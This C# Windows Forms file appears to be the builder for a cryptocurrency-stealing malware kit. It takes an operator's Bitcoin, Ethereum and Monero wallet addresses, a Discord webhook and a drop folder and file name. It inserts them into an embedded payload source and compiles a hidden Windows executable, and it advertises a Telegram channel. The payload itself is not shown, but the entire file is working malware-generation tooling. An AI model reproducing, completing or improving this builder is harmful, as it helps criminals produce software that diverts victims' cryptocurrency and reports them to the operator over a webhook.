using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

  

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            label1.Text = DateTime.Now.ToLongTimeString();
            textBox1.Text = "Your Bitcoin Wallet";
            textBox1.ForeColor = Color.White;
            textBox2.Text = "Your Ethereum Wallet";
            textBox2.ForeColor = Color.White;
            textBox4.Text = "Your Monero Wallet";
            textBox4.ForeColor = Color.White;

            textBox5.Text = "File Name";
            textBox5.ForeColor = Color.White;
            textBox3.Text = "Folder Name";
            textBox3.ForeColor = Color.White;

            textBox6.Text = "Your discord webhook";
            textBox6.ForeColor = Color.White;
            textBox7.Text = "Your name webhook";
            textBox7.ForeColor = Color.White;



        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label1.Text = DateTime.Now.ToLongTimeString();
            timer1.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;
            Params.ReferencedAssemblies.Add("System.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.CompilerOptions = "/unsafe";
            Params.CompilerOptions += "\n/t:winexe";

            Params.OutputAssembly = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            Params.ReferencedAssemblies.Add("System.Management.dll");     
            Params.ReferencedAssemblies.Add("System.IO.Compression.dll");  

            string Source = Properties.Resources.Program;

            if (checkBox1.Checked == true)
            {
                Source = Source.Replace("tlgnotf", "true");
            }

            Source = Source.Replace("btc", textBox1.Text);
            Source = Source.Replace("eth", textBox2.Text);
            Source = Source.Replace("xmr", textBox4.Text);

            Source = Source.Replace("PathWW", textBox3.Text);
            Source = Source.Replace("dpwwr", textBox5.Text);

            Source = Source.Replace("dischoock", textBox6.Text);
            Source = Source.Replace("VOLVER", textBox7.Text);

            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0"); 

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source.ToString());

 

            if (Results.Errors.Count > 0)
            {

                foreach (CompilerError err in Results.Errors)
                    MessageBox.Show(err.ToString(), "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Information);  
            }
            else
            {
                MessageBox.Show("Готово, https://t.me/VolVeRFM");  
            }


        }
    }
}
